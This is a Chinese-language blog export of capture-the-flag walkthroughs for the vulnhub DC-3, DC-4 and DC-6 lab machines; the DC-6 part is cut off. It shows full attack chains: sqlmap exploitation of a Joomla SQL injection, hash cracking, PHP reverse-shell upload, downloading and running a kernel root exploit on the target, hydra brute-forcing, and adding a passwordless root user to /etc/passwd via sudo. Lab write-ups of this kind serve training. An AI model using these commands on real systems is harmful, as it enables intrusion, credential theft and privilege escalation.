<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到ip地址"><a href="#NMAP扫描得到ip地址" class="headerlink" title="NMAP扫描得到ip地址"></a>NMAP扫描得到ip地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.132</span><br><span class="line">Host is up (0.00074s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:44:28:03 (VMware)</span><br></pre></td></tr></table></figure>

<p>得到靶机的ip地址为<code>192.168.147.132</code><br>进行更加详细的扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.147.132 -p0-65535</span><br><span class="line">Nmap scan report for 192.168.147.132                                                                                 </span><br><span class="line">Host is up (0.0026s latency).                                                                                        </span><br><span class="line">Not shown: 65535 closed ports                                                                                        </span><br><span class="line">PORT   STATE SERVICE VERSION                                                                                         </span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                  </span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management                                                           </span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">MAC Address: 00:0C:29:44:28:03 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   2.62 ms 192.168.147.132</span><br></pre></td></tr></table></figure>
<p>只找到一个<code>http(80端口)</code>,得知是一个<a href="https://baike.baidu.com/item/joomla/3104596?fr=aladdin"><code>Joomla</code></a></p>
<h3 id="针对Joomla的攻击"><a href="#针对Joomla的攻击" class="headerlink" title="针对Joomla的攻击"></a>针对Joomla的攻击</h3><p>使用<a href="https://www.freebuf.com/sectool/181440.html">Joomscan</a>工具扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl joomscan.pl --url http://192.168.147.132</span><br><span class="line"></span><br><span class="line">Processing http://192.168.147.132 ...</span><br><span class="line"></span><br><span class="line">[+] FireWall Detector                                                        </span><br><span class="line">[++] Firewall not detected                                                   </span><br><span class="line">                                                                             </span><br><span class="line">[+] Detecting Joomla Version                                                 </span><br><span class="line">[++] Joomla 3.7.0                                                            </span><br><span class="line">                                                                             </span><br><span class="line">[+] Core Joomla Vulnerability                                                </span><br><span class="line">[++] Target Joomla core is not vulnerable                                    </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking Directory Listing                                               </span><br><span class="line">[++] directory has directory listing :                                       </span><br><span class="line">http://192.168.147.132/administrator/components                              </span><br><span class="line">http://192.168.147.132/administrator/modules                                 </span><br><span class="line">http://192.168.147.132/administrator/templates                               </span><br><span class="line">http://192.168.147.132/images/banners                                        </span><br><span class="line">                                                                             </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking apache info/status files                                        </span><br><span class="line">[++] Readable info/status files are not found                                </span><br><span class="line">                                                                             </span><br><span class="line">[+] admin finder                                                             </span><br><span class="line">[++] Admin page : http://192.168.147.132/administrator/                      </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking robots.txt existing                                             </span><br><span class="line">[++] robots.txt is not found                                                 </span><br><span class="line">                                                                             </span><br><span class="line">[+] Finding common backup files name                                         </span><br><span class="line">[++] Backup files are not found                                              </span><br><span class="line">                                                                             </span><br><span class="line">[+] Finding common log files name                                            </span><br><span class="line">[++] error log is not found                                                  </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking sensitive config.php.x file                                     </span><br><span class="line">[++] Readable config files are not found                              </span><br></pre></td></tr></table></figure>
<p>找到了<code>admin</code>的登录页面,并且得出版本为<code>Joomla 3.7.0</code></p>
<p>但是现在没有<code>admin</code>的密码,使用<code>searchsploit</code>工具查找<code>Joomla 3.7.0</code>存在的漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br><span class="line">------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                      |  Path</span><br><span class="line">                                    | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------ ----------------------------------------</span><br><span class="line">Joomla! 3.7.0 - &#x27;com_fields&#x27; SQL In | exploits/php/webapps/42033.txt</span><br><span class="line">------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure>
<p>存在一个<code>SQL 注入</code>漏洞,并且给出了exp(信息太多了不全部写出,只给出关键信息)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Date: 05-19-2017</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>那就直接用<code>sqlmap</code>一把梭</p>
<h3 id="sqlmap-注入sql"><a href="#sqlmap-注入sql" class="headerlink" title="sqlmap 注入sql"></a>sqlmap 注入sql</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.147.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br></pre></td></tr></table></figure>
<p>得出了数据库,然后读取数据表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.147.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</span><br><span class="line"></span><br><span class="line">***********************</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
<p>得出数据表之后脱出数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.147.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__uesr&quot; --dump -p list[fullordering]</span><br><span class="line"></span><br><span class="line">+------+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="line">| id   | email                    | name   | params                                                                                       | username | password                                                     |</span><br><span class="line">+------+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="line">| 629  | freddy@norealaddress.net | admin  | &#123;&quot;admin_style&quot;:&quot;&quot;,&quot;admin_language&quot;:&quot;&quot;,&quot;language&quot;:&quot;&quot;,&quot;editor&quot;:&quot;&quot;,&quot;helpsite&quot;:&quot;&quot;,&quot;timezone&quot;:&quot;&quot;&#125; | admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |</span><br><span class="line">+------+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到了加密之后的admin的密码<br>保存进文件之后使用<code>john</code>工具爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john admin.txt</span><br><span class="line"></span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">snoopy           (?)</span><br></pre></td></tr></table></figure>
<p>得到密码之后登陆进去</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>先查看模板的名称,在<code>Extensions-&gt;Templetes</code> 看到是<code>beez3</code>模板,点进去之后看到文件夹,并且可以上传文件<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586230888126.png" alt="file"></p>
<p>上传反弹shell<br><code>/usr/share/webshells/php/php-reverse-shell.php</code>,修改一下参数</p>
<p>在地址栏访问<code>http://192.168.147.132/templates/beez3/html</code><br>在本地监听端口,找到刚刚上传的shell,并且运行<br>获得一个shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;home&#x2F;kali&#x2F;vulnhub&#x2F;dc-3# nc -vlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">192.168.147.132: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.132] 52528</span><br><span class="line">Linux DC3VM 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</span><br><span class="line"> 13:48:01 up  2:02,  0 users,  load average: 0.00, 0.01, 0.07</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
<p>然后想办法提权</p>
<p>先找一下有没有不用密码的root指令,或者有setuid的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/mount</span><br><span class="line">/tmp/39773/refcount_overflow/39772/ebpf_mapfd_doubleput_exploit/suidhelper</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/ubuntu-core-launcher</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/i386-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line"></span><br><span class="line">没啥用</span><br><span class="line"></span><br><span class="line">sudo -l</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure>

<p>(结果使用内核的漏洞提权)</p>
<p>先查看一下系统版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/issue</span></span><br><span class="line">Ubuntu 16.04 LTS \n \l</span><br></pre></td></tr></table></figure>
<p>然后用<code>searchsploit</code>寻找漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> searchsploit <span class="string">&quot;Ubuntu 16.04&quot;</span></span></span><br><span class="line"></span><br><span class="line">Linux Kernel 4.4.x (Ubuntu 16.04) - &#x27;double-fdput()&#x27; bpf(BPF_PROG_LOAD) Pri | exploits/linux/local/39772.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/39772.txt</span></span><br><span class="line"></span><br><span class="line">Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>

<p>在靶机上的<code>/tmp</code>文件夹下使用<code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code>,并且解压,里面有一个<code>exploit.tar</code>,也解压,运行<code>complie.sh</code>编译会有警告,但是没关系,运行<code>doubleput</code>就能得到<code>root权限</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./doubleput</span></span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>exploit</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>Joomla</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub DC-4靶机</title>
    <url>//DC-4.html</url>
    <content><![CDATA[<p>vulnhub里的 DC-4 靶机</p>
<p>初学者难度</p>
<a id="more"></a>

<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a href="https://www.vulnhub.com/entry/dc-4,313/">vulnhub DC-4</a></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到IP地址"><a href="#NMAP扫描得到IP地址" class="headerlink" title="NMAP扫描得到IP地址"></a>NMAP扫描得到IP地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.133</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
<p>主机发现,ip地址为<code>192.168.147.133</code>,进行详细的扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.147.133 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
<p>真的只开启了 <strong>22和80</strong> 两个端口</p>
<h3 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h3><p><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324062452.png" alt="file"><br>一副可以爆破的样子,直接上 <code>rockyou</code> 字典</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt  192.168.147.133 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.147.133   login: admin   password: happy</span><br></pre></td></tr></table></figure>
<p>得到了密码,登陆进去,可以运行三种指令<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324336037.png" alt="file"></p>
<p>可以抓包修改指令内容,也可以在前端修改html元素写上反弹shell<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586325632432.png" alt="file"><br>在本地监听之后<code>Run</code>就可以接收到shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.133] 34932</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
<p>查看用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>
<h3 id="登录到jim"><a href="#登录到jim" class="headerlink" title="登录到jim"></a>登录到jim</h3><p>挨个进去看看有啥(只有jim有东西)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd jim</span><br><span class="line">ls</span><br><span class="line">backups</span><br><span class="line">mbox</span><br><span class="line">test.sh</span><br><span class="line">ls -al back*</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .</span><br><span class="line">drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..</span><br><span class="line">-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak</span><br></pre></td></tr></table></figure>

<p>看名字就知道应该是备份的旧密码,本地保存之后拿去用<code>hydra</code>爆破一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P password.txt ssh://192.168.147.133:22</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.147.133   login: jim   password: jibril04</span><br></pre></td></tr></table></figure>
<p>得到密码之后连接上去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.147.133</span><br><span class="line">jim@192.168.147.133&#39;s password:</span><br><span class="line"></span><br><span class="line">You have mail.</span><br><span class="line">jim@dc-4:~$ whoami</span><br><span class="line">jim</span><br></pre></td></tr></table></figure>
<h3 id="切换到charles"><a href="#切换到charles" class="headerlink" title="切换到charles"></a>切换到charles</h3><p>他说有一个邮件,用<code>mail</code>命令查看一下邮件的路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jim@dc-4:/var$ mail</span><br><span class="line">Mail version 8.1.2 01/15/2001.  Type ? for help.</span><br><span class="line">&quot;/var/mail/jim&quot;: 1 message 1 unread</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">U  1 charles@dc-4       Sat Apr 06 21:15   27/715   Holidays</span></span><br><span class="line">&amp; Held 1 message in /var/mail/jim</span><br><span class="line"></span><br><span class="line">cat /var/mail/jim</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
<p>直接给密码,这也太棒了</p>
<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>切换到<code>charles</code>用户,查找一下能够提权的东西</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">charles@dc-4:/var$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
<p>这是啥指令,不知道,看一下help</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">teehee --help</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, do not overwrite</span><br></pre></td></tr></table></figure>
<p>看到这条,可以写文件,并且是可以<code>sudo</code>的,就用它提权了(其实我不知道这里怎么提权,百度了资料)</p>
<p>有两种办法,第一种是在<code>/etc/passwd</code>里面追加一个用户,和<code>root</code>的权限一样,第二种是修改定时任务<br>我用的是第一种</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">charles@dc-4:/var$ echo &quot;shiroha::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ cat /etc/passwd | grep &quot;shiroha&quot;</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ su shiroha</span><br><span class="line">root@dc-4:/var# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dc-4:/var# cat /root/</span><br><span class="line">.bash_history  .bashrc        flag.txt       .nano/         .profile       </span><br><span class="line">root@dc-4:/var# cat /root/flag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>exploit</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>enum</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub DC-6靶机</title>
    <url>//DC-6.html</url>
    <content><![CDATA[<p>vulnhub里的 DC-6 靶机</p>
<p>初学者难度</p>
<a id="more"></a>

<h3 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h3><p><a href="https://www.vulnhub.com/entry/dc-6,315/">vulnhub DC-6</a></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到IP"><a href="#NMAP扫描得到IP" class="headerlink" title="NMAP扫描得到IP"></a>NMAP扫描得到IP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for wordy (192.168.147.135)</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:C1:80:5F (VMware)</span><br></pre></td></tr></table></figure>
<p>详细扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.135 -A -p0-65535</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.135</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 79 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://wordy/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 00:0C:29:C1:80:5F (VMware)</span><br></pre></td></tr></table></figure>
<p>需要修改<code>hosts</code>文件访问<code>http://wordy</code><br>然后就可以访问网站了</p>
<h3 id="针对WordPress的攻击"><a href="#针对WordPress的攻击" class="headerlink" title="针对WordPress的攻击"></a>针对WordPress的攻击</h3><p>使用<code>wpscan</code>工具扫描用户名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy --enumerate u</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] graham</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] mark</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] sarah</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jens</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>扫描出来的用户名,加上作者给的提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OK, this isn&#39;t really a clue as such, but more of some &quot;we don&#39;t want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</span><br><span class="line"></span><br><span class="line">cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></pre></td></tr></table></figure>
<p>创建好字典之后爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy -U user -P password.txt</span><br><span class="line"></span><br><span class="line">[SUCCESS] - mark / helpdesk01</span><br></pre></td></tr></table></figure>
<p>使用<code>mark</code>的账户登录进去<br>查看一下,没有可以挂马的地方啊???<br><a href="https://cloud.tencent.com/developer/article/1472276">师傅的WP</a>上说<code>activity monitor</code> 存在漏洞,用<code>searchsploit</code>查一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit activity monitor</span><br><span class="line"></span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Comm | exploits/php/webapps/45274.html</span><br></pre></td></tr></table></figure>
<p>改一下参数就可以执行一个反弹shell</p>
<h3 id="提权到graham"><a href="#提权到graham" class="headerlink" title="提权到graham"></a>提权到graham</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/vulnhub/dc-6# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.135] 49302</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
<p>看一下用户目录和里面的东西,在<code>/home/mark/stuff/</code>里面找到一个备忘录?</p>
